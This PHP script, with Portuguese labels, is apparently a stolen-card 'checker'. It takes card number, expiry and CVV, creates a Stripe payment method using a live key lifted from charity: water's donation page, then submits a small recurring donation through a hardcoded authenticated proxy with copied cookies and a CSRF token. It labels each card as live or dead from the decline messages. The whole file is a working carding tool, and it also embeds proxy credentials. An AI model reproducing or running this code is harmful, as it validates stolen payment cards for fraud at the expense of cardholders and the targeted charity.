<?php
error_reporting(0);

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex, $lista)){
    die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning">$cybersecofc</span><br>');
}

function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_REQUEST['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];

if (strlen($ano) < 4) {
    $ano = "20" . $ano;
}
$anoShort = substr($ano, -2);

function detectarBandeira($cc) {
    $bandeiras = [
        'Visa' => '/^4[0-9]{12}(?:[0-9]{3})?$/',
        'Mastercard' => '/^(5[1-5][0-9]{14}|2(?:2[2-9][0-9]{12}|[3-6][0-9]{13}|7[01][0-9]{12}|720[0-9]{12}))$/',
        'Elo' => '/^(401178|401179|431274|438935|451416|457393|4576|457630|457631|457632|504175|506699|50670[0-9]{2}|50671[0-9]{2}|50672[0-9]{2}|50673[0-9]{2}|50674[0-9]{2}|50675[0-9]{2}|50676[0-9]{2}|50677[0-9]{2}|50678[0-9]{2}|50679[0-9]{2}|509000|627780|636297|636368)[0-9]{10,12}$/',
        'Hipercard' => '/^(606282|3841)[0-9]{10,15}$/',
        'Amex' => '/^3[47][0-9]{13}$/',
        'Diners' => '/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/',
        'Discover' => '/^6(?:011|5[0-9]{2})[0-9]{12}$/',
        'Aura' => '/^50[0-9]{14,17}$/',
        'JCB' => '/^(?:2131|1800|35\d{3})\d{11}$/'
    ];

    foreach ($bandeiras as $bandeira => $pattern) {
        if (preg_match($pattern, $cc)) {
            return $bandeira;
        }
    }
    return 'Desconhecida';
}

$inicio = microtime(true);
$bandeira = detectarBandeira($cc);


$proxys = [
   [
        'ip' => 'gw.aproxy.com',
        'porta' => '2312',
        'user' => 'ap-nherz7p2v4xm',
        'pass' => 'G6hlGv7cZVU5Csvv',
        'pais' => 'Proxy',
        'cidade' => 'Server'
    ]
];


$proxy = $proxys[array_rand($proxys)];
$proxyInfo = $proxy['pais'] . ' - ' . $proxy['cidade'];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_PROXY, $proxy['ip']);
curl_setopt($ch, CURLOPT_PROXYPORT, $proxy['porta']);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['user'] . ':' . $proxy['pass']);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: api.stripe.com',
    'sec-ch-ua-platform: "Windows"',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0',
    'accept: application/json',
    'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
    'content-type: application/x-www-form-urlencoded',
    'sec-ch-ua-mobile: ?0',
    'origin: https://js.stripe.com',
    'sec-fetch-site: same-site',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://js.stripe.com/',
    'accept-language: pt-BR,pt;q=0.9',
    'priority: u=1, i'
]);

$postFields = "type=card&" .
              "billing_details[address][postal_code]=&" .
              "billing_details[address][city]=&" .
              "billing_details[address][country]=US&" .
              "billing_details[address][line1]=&" .
              "billing_details[email]=gmail%40gmail.com&" .
              "billing_details[name]=cyber+sec&" .
              "card[number]=" . $cc . "&" .
              "card[cvc]=" . $cvv . "&" .
              "card[exp_month]=" . str_pad($mes, 2, '0', STR_PAD_LEFT) . "&" .
              "card[exp_year]=" . $anoShort . "&" .
              "guid=NA&muid=NA&sid=NA&" .
              "pasted_fields=number&" .
              "payment_user_agent=stripe.js%2Faaa289431e%3B+stripe-js-v3%2Faaa289431e%3B+card-element&" .
              "referrer=https%3A%2F%2Fwww.charitywater.org&" .
              "time_on_page=112122&" .
              "client_attribution_metadata[client_session_id]=9e3da367-0648-4f26-b5a2-bedd4c9beaee&" .
              "client_attribution_metadata[merchant_integration_source]=elements&" .
              "client_attribution_metadata[merchant_integration_subtype]=card-element&" .
              "client_attribution_metadata[merchant_integration_version]=2017&" .
              "key=pk_live_51049Hm4QFaGycgRKOIbupRw7rf65FJESmPqWZk9Jtpf2YCvxnjMAFX7dOPAgoxv9M2wwhi5OwFBx1EzuoTxNzLJD00ViBbMvkQ";

curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
$response1 = curl_exec($ch);
$httpCode1 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError1 = curl_error($ch);
curl_close($ch);


if ($httpCode1 != 200 || !$response1) {
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Host: api.stripe.com',
        'sec-ch-ua-platform: "Windows"',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0',
        'accept: application/json',
        'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
        'content-type: application/x-www-form-urlencoded',
        'sec-ch-ua-mobile: ?0',
        'origin: https://js.stripe.com',
        'sec-fetch-site: same-site',
        'sec-fetch-mode: cors',
        'sec-fetch-dest: empty',
        'referer: https://js.stripe.com/',
        'accept-language: pt-BR,pt;q=0.9',
        'priority: u=1, i'
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    $response1 = curl_exec($ch);
    $httpCode1 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
}

$resposta1 = json_decode($response1, true);

if ($httpCode1 != 200 || !isset($resposta1['id'])) {
    $erro = isset($resposta1['error']['message']) ? $resposta1['error']['message'] : 'Erro desconhecido';
    echo '<div style="background: #000; color: #fff; padding: 10px; margin: 10px; border: 1px solid #f00;">';
    echo '<h3>🔍 DEBUG - ERRO STRIPE (PRIMEIRA REQUISIÇÃO)</h3>';
    echo '<strong>HTTP Code:</strong> ' . $httpCode1 . '<br>';
    echo '<strong>Resposta Completa:</strong><br>';
    echo '<pre style="background: #333; color: #0f0; padding: 10px; overflow: auto;">' . htmlspecialchars(print_r($resposta1, true)) . '</pre>';
    echo '<strong>Resposta Raw:</strong><br>';
    echo '<pre style="background: #333; color: #ff0; padding: 10px; overflow: auto;">' . htmlspecialchars($response1) . '</pre>';
    echo '</div>';
    die('<span class="badge badge-danger">REPROVADA</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-danger">Erro Stripe: ' . $erro . '</span> ➔ <span class="badge badge-info">HTTP: '.$httpCode1.'</span> ➔ ('.number_format(microtime(true)-$inicio,2).'s) ➔ Proxy: '.$proxyInfo.' ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}

$paymentMethodId = $resposta1['id'];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.charitywater.org/donate/stripe');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_PROXY, $proxy['ip']);
curl_setopt($ch, CURLOPT_PROXYPORT, $proxy['porta']);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['user'] . ':' . $proxy['pass']);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.charitywater.org',
    'Cookie: countrypreference=US; optimizelyEndUserId=oeu1771380180535r0.42796280163367617; optimizelySession=1771380183219; _gcl_au=1.1.1481556720.1771380185; _ga=GA1.1.396308611.1771380187; FPAU=1.1.1481556720.1771380185; _gtmeec=e30%3D; maji_bed_sn=%7B%22x-ga-gcs%22%3A%22G111%22%2C%22ip_override%22%3A%22201.17.208.241%22%7D; _fbp=fb.1.1771380195881.1940853693; maji_bed_p=%7B%22client_id%22%3A%22396308611.1771380187%22%2C%22ga_session_id%22%3A%221771380186%22%2C%22ga_session_number%22%3A1%2C%22language%22%3A%22pt-br%22%2C%22page_location%22%3A%22https%3A%2F%2Fwww.charitywater.org%2F%22%2C%22page_title%22%3A%22charity%3A%20water%20%7C%20Help%20Bring%20Clean%20and%20Safe%20Water%20to%20Communities%22%2C%22screen_resolution%22%3A%221600x900%22%2C%22user_agent%22%3A%22Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F142.0.0.0%20Safari%2F537.36%20OPR%2F126.0.0.0%22%7D; maji_bed_t=%7B%22t_page_location%22%3A%22https%3A%2F%2Fwww.charitywater.org%2F%22%2C%22t_page_title%22%3A%22charity%3A%20water%20%7C%20Help%20Bring%20Clean%20and%20Safe%20Water%20to%20Communities%22%2C%22t_screen_resolution%22%3A%221600x900%22%2C%22t_user_agent%22%3A%22Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F142.0.0.0%20Safari%2F537.36%20OPR%2F126.0.0.0%22%2C%22t_client_id%22%3A%22396308611.1771380187%22%2C%22t_ga_session_id%22%3A%221771380186%22%2C%22t_ga_session_number%22%3A1%2C%22t_language%22%3A%22pt-br%22%7D; _uetsid=f8a5cb700c6d11f18d0b0f56617ca4a2; _uetvid=f8a62a300c6d11f19fa767bbd9d739ae; CookieScriptConsent={\"googleconsentmap\":{\"ad_storage\":\"targeting\",\"analytics_storage\":\"performance\",\"ad_user_data\":\"targeting\",\"ad_personalization\":\"targeting\",\"functionality_storage\":\"functionality\",\"personalization_storage\":\"functionality\",\"security_storage\":\"functionality\"},\"bannershown\":1,\"action\":\"accept\",\"consenttime\":1718647469,\"categories\":\"[\\\"functionality\\\",\\\"targeting\\\",\\\"performance\\\",\\\"unclassified\\\"]\",\"key\":\"87247d52-4eee-4c90-9147-2b186dc32ac3\"}; _ga_SKG6MDYX1T=GS2.1.s1771380186',
    'sec-ch-ua-platform: "Windows"',
    'x-csrf-token: D1TjEsad0SZFnJ43zjIB_50J3iD6DWVM7o4judw6HQKwWEvvBEPu8aOzn23JcgA2mG_WRnK3NmIs27rHeRQPoQ',
    'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile: ?0',
    'x-requested-with: XMLHttpRequest',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0',
    'accept: */*',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.charitywater.org',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://www.charitywater.org/',
    'accept-language: pt-BR,pt;q=0.9',
    'priority: u=1, i'
]);

$postFields2 = "country=us&" .
               "payment_intent%5Bemail%5D=gmail%40gmail.com&" .
               "payment_intent%5Bamount%5D=6&" .
               "payment_intent%5Bcurrency%5D=usd&" .
               "payment_intent%5Bmetadata%5D%5Bdonation_kind%5D=water&" .
               "payment_intent%5Bpayment_method%5D=" . $paymentMethodId . "&" .
               "payment_intent%5Bsetup_future_usage%5D=off_session&" .
               "disable_existing_subscription_check=false&" .
               "donation_form%5Bamount%5D=6&" .
               "donation_form%5Banonymous%5D=true&" .
               "donation_form%5Bcomment%5D=&" .
               "donation_form%5Bdisplay_name%5D=&" .
               "donation_form%5Bemail%5D=gmail%40gmail.com&" .
               "donation_form%5Bname%5D=cyber&" .
               "donation_form%5Bpayment_gateway_token%5D=&" .
               "donation_form%5Bpayment_monthly_subscription%5D=true&" .
               "donation_form%5Bsurname%5D=sec&" .
               "donation_form%5Bcampaign_id%5D=a5826748-d59d-4f86-a042-1e4c030720d5&" .
               "donation_form%5Bsetup_intent_id%5D=&" .
               "donation_form%5Bsubscription_period%5D=monthly&" .
               "donation_form%5Bmetadata%5D%5Bdonation_kind%5D=water&" .
               "donation_form%5Bmetadata%5D%5Bemail_consent_granted%5D=true&" .
               "donation_form%5Bmetadata%5D%5Bfull_donate_page_url%5D=https%3A%2F%2Fwww.charitywater.org%2F&" .
               "donation_form%5Bmetadata%5D%5Bphone_number%5D=&" .
               "donation_form%5Bmetadata%5D%5Bphone_number_consent_granted%5D=false&" .
               "donation_form%5Bmetadata%5D%5Bplaid_account_id%5D=&" .
               "donation_form%5Bmetadata%5D%5Bplaid_public_token%5D=&" .
               "donation_form%5Bmetadata%5D%5Bstrict_consent_region%5D=false&" .
               "donation_form%5Bmetadata%5D%5Burl_params%5D%5Btouch_type%5D=1&" .
               "donation_form%5Bmetadata%5D%5Bsession_url_params%5D%5Btouch_type%5D=1&" .
               "donation_form%5Bmetadata%5D%5Bwith_saved_payment%5D=false&" .
               "donation_form%5Baddress%5D%5Baddress_line_1%5D=&" .
               "donation_form%5Baddress%5D%5Baddress_line_2%5D=&" .
               "donation_form%5Baddress%5D%5Bcity%5D=&" .
               "donation_form%5Baddress%5D%5Bcountry%5D=&" .
               "donation_form%5Baddress%5D%5Bzip%5D=&" .
               "subscription%5Bamount%5D=6&" .
               "subscription%5Bcountry%5D=us&" .
               "subscription%5Bemail%5D=gmail%40gmail.com&" .
               "subscription%5Bfull_name%5D=cyber+sec&" .
               "subscription%5Bis_annual%5D=false&" .
               "idempotency_key=2891c9a5-c102-4928-bfa9-f028d358ec29";

curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields2);
$response2 = curl_exec($ch);
$httpCode2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$fim = microtime(true);
$tempoFormatado = number_format($fim - $inicio, 2);


if ($httpCode2 == 418 || $httpCode2 == 403 || $httpCode2 == 429 || !$response2) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.charitywater.org/donate/stripe');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Host: www.charitywater.org',
        'Cookie: countrypreference=US; optimizelyEndUserId=oeu1771380180535r0.42796280163367617; optimizelySession=1771380183219; _gcl_au=1.1.1481556720.1771380185; _ga=GA1.1.396308611.1771380187; FPAU=1.1.1481556720.1771380185; _gtmeec=e30%3D; maji_bed_sn=%7B%22x-ga-gcs%22%3A%22G111%22%2C%22ip_override%22%3A%22201.17.208.241%22%7D; _fbp=fb.1.1771380195881.1940853693; maji_bed_p=%7B%22client_id%22%3A%22396308611.1771380187%22%2C%22ga_session_id%22%3A%221771380186%22%2C%22ga_session_number%22%3A1%2C%22language%22%3A%22pt-br%22%2C%22page_location%22%3A%22https%3A%2F%2Fwww.charitywater.org%2F%22%2C%22page_title%22%3A%22charity%3A%20water%20%7C%20Help%20Bring%20Clean%20and%20Safe%20Water%20to%20Communities%22%2C%22screen_resolution%22%3A%221600x900%22%2C%22user_agent%22%3A%22Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F142.0.0.0%20Safari%2F537.36%20OPR%2F126.0.0.0%22%7D; maji_bed_t=%7B%22t_page_location%22%3A%22https%3A%2F%2Fwww.charitywater.org%2F%22%2C%22t_page_title%22%3A%22charity%3A%20water%20%7C%20Help%20Bring%20Clean%20and%20Safe%20Water%20to%20Communities%22%2C%22t_screen_resolution%22%3A%221600x900%22%2C%22t_user_agent%22%3A%22Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F142.0.0.0%20Safari%2F537.36%20OPR%2F126.0.0.0%22%2C%22t_client_id%22%3A%22396308611.1771380187%22%2C%22t_ga_session_id%22%3A%221771380186%22%2C%22t_ga_session_number%22%3A1%2C%22t_language%22%3A%22pt-br%22%7D; _uetsid=f8a5cb700c6d11f18d0b0f56617ca4a2; _uetvid=f8a62a300c6d11f19fa767bbd9d739ae; CookieScriptConsent={\"googleconsentmap\":{\"ad_storage\":\"targeting\",\"analytics_storage\":\"performance\",\"ad_user_data\":\"targeting\",\"ad_personalization\":\"targeting\",\"functionality_storage\":\"functionality\",\"personalization_storage\":\"functionality\",\"security_storage\":\"functionality\"},\"bannershown\":1,\"action\":\"accept\",\"consenttime\":1718647469,\"categories\":\"[\\\"functionality\\\",\\\"targeting\\\",\\\"performance\\\",\\\"unclassified\\\"]\",\"key\":\"87247d52-4eee-4c90-9147-2b186dc32ac3\"}; _ga_SKG6MDYX1T=GS2.1.s1771380186',
        'sec-ch-ua-platform: "Windows"',
        'x-csrf-token: D1TjEsad0SZFnJ43zjIB_50J3iD6DWVM7o4judw6HQKwWEvvBEPu8aOzn23JcgA2mG_WRnK3NmIs27rHeRQPoQ',
        'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile: ?0',
        'x-requested-with: XMLHttpRequest',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0',
        'accept: */*',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'origin: https://www.charitywater.org',
        'sec-fetch-site: same-origin',
        'sec-fetch-mode: cors',
        'sec-fetch-dest: empty',
        'referer: https://www.charitywater.org/',
        'accept-language: pt-BR,pt;q=0.9',
        'priority: u=1, i'
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields2);
    $response2 = curl_exec($ch);
    $httpCode2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode2 == 418 || $httpCode2 == 403 || $httpCode2 == 429 || !$response2) {
        echo '<div style="background: #000; color: #fff; padding: 10px; margin: 10px; border: 1px solid #f00;">';
        echo '<h3>🔍 DEBUG - BLOQUEADO CLOUDFLARE</h3>';
        echo '<strong>HTTP Code:</strong> ' . $httpCode2 . '<br>';
        echo '<strong>Resposta Raw:</strong><br>';
        echo '<pre style="background: #333; color: #ff0; padding: 10px; overflow: auto;">' . htmlspecialchars($response2) . '</pre>';
        echo '</div>';
        die('<span class="badge badge-danger">REPROVADA</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-danger">Bloqueado pelo Cloudflare (HTTP '.$httpCode2.')</span> ➔ ('.$tempoFormatado.'s) ➔ Proxy: '.$proxyInfo.' ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
    }
}

$respostaJson = json_decode($response2, true);

echo '<div style="background: #000; color: #fff; padding: 10px; margin: 10px; border: 1px solid #0f0;">';
echo '<h3>🔍 DEBUG - RESPOSTA COMPLETA (SEGUNDA REQUISIÇÃO)</h3>';
echo '<strong>HTTP Code:</strong> ' . $httpCode2 . '<br>';
echo '<strong>JSON Decodificado:</strong><br>';
echo '<pre style="background: #333; color: #0f0; padding: 10px; overflow: auto;">' . htmlspecialchars(print_r($respostaJson, true)) . '</pre>';
echo '<strong>Resposta Raw:</strong><br>';
echo '<pre style="background: #333; color: #ff0; padding: 10px; overflow: auto;">' . htmlspecialchars($response2) . '</pre>';
echo '</div>';


if ($respostaJson === null) {
    $resumoResposta = substr($response2, 0, 200);
    die('<span class="badge badge-danger">REPROVADA</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-danger">Resposta não-JSON</span> ➔ <span class="badge badge-info">HTTP: '.$httpCode2.' | Resposta: '.htmlspecialchars($resumoResposta).'</span> ➔ ('.$tempoFormatado.'s) ➔ Proxy: '.$proxyInfo.' ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}


if (isset($respostaJson['redirectUrl']) && $respostaJson['redirectUrl'] == '/thank-you') {
    die('<span class="badge badge-success">✅ APROVADA (PAGO)</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-success">💰 PAGAMENTO CONFIRMADO! (Redirect para thank-you)</span> ➔ <span class="badge badge-info">Bandeira: '.$bandeira.'</span> ➔ ('.$tempoFormatado.'s) ➔ Proxy: '.$proxyInfo.' ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}


$mensagem = '';
if (isset($respostaJson['error']['message'])) {
    $mensagem = $respostaJson['error']['message'];
} elseif (isset($respostaJson['message'])) {
    $mensagem = $respostaJson['message'];
} elseif (isset($respostaJson['decline_message'])) {
    $mensagem = $respostaJson['decline_message'];
}

$codigo = isset($respostaJson['error']['code']) ? $respostaJson['error']['code'] : '';


if (stripos($mensagem, 'insufficient funds') !== false) {
    die('<span class="badge badge-success">✅ APROVADA (LIVE - Saldo Insuficiente)</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-success">💰 CARTÃO VIVO!</span> ➔ <span class="badge badge-info">Bandeira: '.$bandeira.' | Resposta: '.$mensagem.'</span> ➔ ('.$tempoFormatado.'s) ➔ Proxy: '.$proxyInfo.' ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}

if (stripos($mensagem, 'security code is incorrect') !== false) {
    die('<span class="badge badge-success">✅ APROVADA (LIVE - CVV Incorreto)</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-success">💰 CARTÃO VIVO!</span> ➔ <span class="badge badge-info">Bandeira: '.$bandeira.' | Resposta: '.$mensagem.'</span> ➔ ('.$tempoFormatado.'s) ➔ Proxy: '.$proxyInfo.' ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}

if (stripos($mensagem, 'expired') !== false) {
    die('<span class="badge badge-danger">❌ REPROVADA (DIE - Cartão Expirado)</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-danger">'.$mensagem.'</span> ➔ <span class="badge badge-info">Bandeira: '.$bandeira.'</span> ➔ ('.$tempoFormatado.'s) ➔ Proxy: '.$proxyInfo.' ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}

if (isset($respostaJson['payment_status']) && $respostaJson['payment_status'] == 'succeeded') {
    die('<span class="badge badge-success">✅ APROVADA (PAGO)</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-success">💰 PAGAMENTO CONFIRMADO!</span> ➔ <span class="badge badge-info">Bandeira: '.$bandeira.'</span> ➔ ('.$tempoFormatado.'s) ➔ Proxy: '.$proxyInfo.' ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}


$motivo = !empty($mensagem) ? $mensagem : 'Negado - ' . json_encode($respostaJson);
if (!empty($codigo)) {
    $motivo .= ' (Código: ' . $codigo . ')';
}

die('<span class="badge badge-danger">❌ REPROVADA (DIE)</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-danger">'.$motivo.'</span> ➔ <span class="badge badge-info">Bandeira: '.$bandeira.'</span> ➔ ('.$tempoFormatado.'s) ➔ Proxy: '.$proxyInfo.' ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
?>
